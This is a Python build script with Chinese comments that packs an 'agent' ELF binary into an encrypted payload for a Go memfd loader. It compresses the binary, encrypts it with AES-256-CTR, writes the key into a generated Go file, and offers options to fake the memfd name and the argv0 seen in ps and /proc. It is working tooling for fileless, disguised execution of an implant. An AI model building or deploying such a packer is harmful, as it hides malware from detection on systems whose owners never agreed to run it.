#!/usr/bin/env python3
"""把 agent ELF 打包成 memfd loader 的内嵌载荷。

流程: zlib 压缩 -> AES-256-CTR 加密 -> payload.enc（nonce(16) || ct），
key.go 存 key；loader 解密后以 sha256(压缩体) 前 16 字节校验完整性
（头 16 字节为校验段，随后为密文）。

openssl enc 不支持 GCM，故用 CTR；认证用明文哈希前缀替代 AEAD。

用法:
  python3 pack.py <agent.elf> [--memfd-name S] [--argv0 S]
产物:
  payload.enc / key.go（与 loader.go 同目录，供 go build 使用）
"""
import argparse
import hashlib
import os
import secrets
import subprocess
import zlib

AES_KEY_LEN = 32
NONCE_LEN = 16  # CTR IV
TAG_LEN = 16    # sha256(压缩体) 前 16 字节


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("agent_elf")
    ap.add_argument("--memfd-name", default=None,
                    help="memfd 名（/proc/<pid>/exe 显示段），默认保持 loader 内置值")
    ap.add_argument("--argv0", default=None,
                    help="覆盖 ps 可见的 cmdline 首段，默认 /proc/self/fd/<fd>")
    args = ap.parse_args()

    raw = open(args.agent_elf, "rb").read()
    if raw[:4] != b"\x7fELF":
        raise SystemExit(f"{args.agent_elf}: 不是 ELF")

    comp = zlib.compress(raw, 9)
    tag = hashlib.sha256(comp).digest()[:TAG_LEN]
    key = secrets.token_bytes(AES_KEY_LEN)
    nonce = secrets.token_bytes(NONCE_LEN)

    ct = subprocess.run(
        ["openssl", "enc", "-aes-256-ctr", "-K", key.hex(), "-iv", nonce.hex()],
        input=tag + comp, capture_output=True, check=True).stdout

    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "payload.enc"), "wb") as f:
        f.write(nonce + ct)
    key_lines = ", ".join("0x%02x" % b for b in key)
    with open(os.path.join(here, "key.go"), "w") as f:
        f.write("package main\n\n// 由 pack.py 生成，勿手改。\nvar payloadKey = []byte{%s}\n" % key_lines)

    print("agent:   %s (%d B)" % (args.agent_elf, len(raw)))
    print("packed:  payload.enc (%d B, 占原 %.1f%%)" % (len(nonce + ct), 100.0 * (len(nonce + ct)) / len(raw)))

    if args.memfd_name or args.argv0:
        print("ldflags: -X 'main.memfdName=%s' -X 'main.argv0=%s'" %
              (args.memfd_name or "", args.argv0 or ""))


if __name__ == "__main__":
    main()
